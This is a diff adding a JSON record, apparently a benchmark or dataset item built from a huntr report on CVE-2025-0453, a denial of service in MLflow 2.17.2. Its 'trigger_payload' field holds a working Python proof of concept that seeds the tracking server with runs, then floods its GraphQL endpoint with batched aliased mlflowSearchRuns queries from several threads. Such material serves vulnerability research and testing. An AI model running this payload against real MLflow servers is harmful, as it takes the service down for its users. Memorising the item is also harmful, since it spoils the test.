@@ -1,0 +1,15 @@
+{
+  "file_id": "188_mlflow_huntr_788327ec-714a-4d5c-83aa-8df04dd7612b",
+  "numeric_id": "188",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Denial of service through batched GraphQL queries in MLFlow due to insufficient resource pool",
+  "cve": "CVE-2025-0453",
+  "cwe": "CWE-410: Insufficient Resource Pool",
+  "library": "mlflow",
+  "affected_version": "== 2.17.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "from random import randint\nfrom tqdm import tqdm\nfrom mlflow import log_param, set_tracking_uri, start_run\nN = 2000\nset_tracking_uri(\"http://localhost:5000\")\nfor n in tqdm(range(N), total=N):\n    with start_run():\n        log_param(\"param1\", randint(0, 100))\n\nimport requests\nimport json\nfrom random import choices\nimport string\nimport threading\nTARGET = \"http://localhost:5000\"\nEXPERIMENT_ID = 0\nN = 20\ninternal_query = \" \".join([\n    ''.join(choices(string.ascii_letters, k=8)) + r': mlflowSearchRuns(input: { experimentIds: [\"' + str(EXPERIMENT_ID) + '\"] }) { runs { info { runId } } }'\n    for _ in range(N)\n])\nquery = 'mutation something {{ {} }}'.format(internal_query)\nprint(\"Query size (in bytes):\", len(query.encode(\"utf-8\")))\npayload = {\n    \"query\": query,\n    \"variables\": {},\n    \"operation\": \"something\"\n}\ndef send_req():\n    r = requests.post(\"{}/graphql\".format(TARGET), data=json.dumps(payload), headers={\"Content-Type\": \"application/json\"})\n    print(r.elapsed.total_seconds())\n    print(\"Posting!\")\nTHREADS = 4\nfor _ in range(THREADS):\n    threading.Thread(target=send_req).start()",
+  "oracle": "The tracking server becomes unresponsive to other requests while the batched queries are pending."
+}
